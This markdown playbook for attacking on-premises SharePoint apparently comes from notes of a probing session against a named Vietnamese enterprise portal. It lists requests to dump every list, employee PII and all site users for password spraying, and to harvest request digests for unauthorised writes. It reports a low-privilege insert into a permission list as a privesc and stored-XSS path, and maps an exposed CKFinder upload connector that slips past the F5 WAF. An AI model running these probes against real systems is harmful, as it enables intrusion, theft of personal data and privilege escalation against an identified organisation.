# SharePoint on-prem recon (field-proven: portal.evnhanoi.vn, IIS 10 + F5, SharePoint 2013/2016)

## Fingerprint
- 404 pages carry `X-OfficeDefaultPage: 1`; IIS detailed errors; `/Pages/*.aspx`, `/_layouts/15/`, `/_vti_bin/`, `/_catalogs/users/*`.
- FedAuth cookie = base64( `0xEF BB BF` + XML ): `<SP>0#.f|aspnetmembership|<user>,<id>,True,<sig>,<base-url></SP>` — decode with `base64 -d | tail -c+4` to confirm which account the cookie holds.

## Authenticated enumeration (GET — no digest needed)
```
/_api/web/currentuser                          → LoginName/Email/Id (session-alive check)
/_api/web/lists                                → every list: Title, ItemCount, EntityTypeName
/_api/web/lists/getbytitle('<Title>')/items?$top=5000&$select=Id,Title,<fields>
                                               → full row dump; intranet portals usually hold
                                                 PII lists (users/employees) readable by ANY authed user
/_api/web/siteusers                            → ALL site users: LoginName i:0#.f|aspnetmembership|<u>,
                                                 Email, IsSiteAdmin (spray list + admin identification)
/_api/web/webs                                 → subweb tree = org chart (per-department sites)
/_vti_bin/{sites,usergroup,spsearch}.asmx      → 200 SOAP stubs even where lists.asmx/webs.asmx 404
```
Auth oracle: same endpoint without cookie → `403` XML `<m:error>-2147024891` (proves auth boundary; data is auth-only, not anonymous — still a finding when any low-priv user can read it).

## Writes / privesc probe
`POST /_api/contextinfo` may 404 on hardened boxes — fallback digest source: GET any `.aspx` page, regex `__REQUESTDIGEST" value="([^"]+)"` (or `formDigestValue":"..."`).
Then:
```
POST /_api/web/lists/getbytitle('<L>')/items          {"__metadata":{"type":"SP.Data.<EntityType>ListItem"},<fields>}   → 201 = WRITE
POST .../items(<id>)  X-HTTP-Method: MERGE|DELETE, IF-MATCH: *                                                          → edit/delete
```
Always clean up test items (`DELETE` the created ID) and record it. On the EVNHN portal a normal user could INSERT into the permission-driving user list — privesc/stored-XSS vector via fields like `PerJson`/`RolesId`.

## CKFinder v3 on SharePoint (unusual connector shape)
- UI at `/ckfinder/ckfinder.html` (©2019 CKSource). Classic connector paths `core/connector/{php,aspx,asp,ashx}/connector.*` all 404 — the real connector is a single .NET binary at `/ckfinder/connector?command=<Cmd>&type=<T>&currentFolder=/`.
- `command=Init` → 200 config JSON (`s`,`c`,`thumbs`,`images.max`). `GetFolders` → folder tree + `acl` (1023 = full). Response `currentFolder.url` reveals upload root (`/ckfinder/userfiles/<dir>/<folder>/`).
- `GetFiles`/`DownloadFile` may 404 on some builds. Mutating commands (`FileUpload`,`CreateFolder`,`RenameFile`,`CopyFiles`) return `400 {"error":{"number":109,"message":"Invalid request."}}` = reachable but missing required params — NOT an auth block; keep probing params (v3 FileUpload needs `upload` multipart field + valid `type`+`currentFolder`).
- Only `type=Images` may be configured (`Files` 404, `Flash` → err12 "invalid resource type"). Folder names leak org/event structure.
- WAF note: `/ckfinder/config.php` and php/ashx paths get F5 "Request Rejected" 200-pages; the .NET `connector` passes.

## Flaky-LB retry rule (VN enterprise, mandatory)
This class of host intermittently returns **404 or SSL WRONG_VERSION_NUMBER on ~30-50% of identical requests** (pool/LB behind hostname). Rules:
- Every probe loop needs `retries=4-8` + ~1s backoff per request; a single 404 is NOT a miss — this session's LUser/CKFinder findings only confirmed on retry.
- curl `-o`/`-D` on MSYS hits "client returned ERROR on write of N bytes" (exit 23) against these hosts — use Python urllib with retry instead of curl for any scripted probing here.
- Verify scripts must retry too, or ad-hoc verification flaps PASS↔PARTIAL for no real reason.
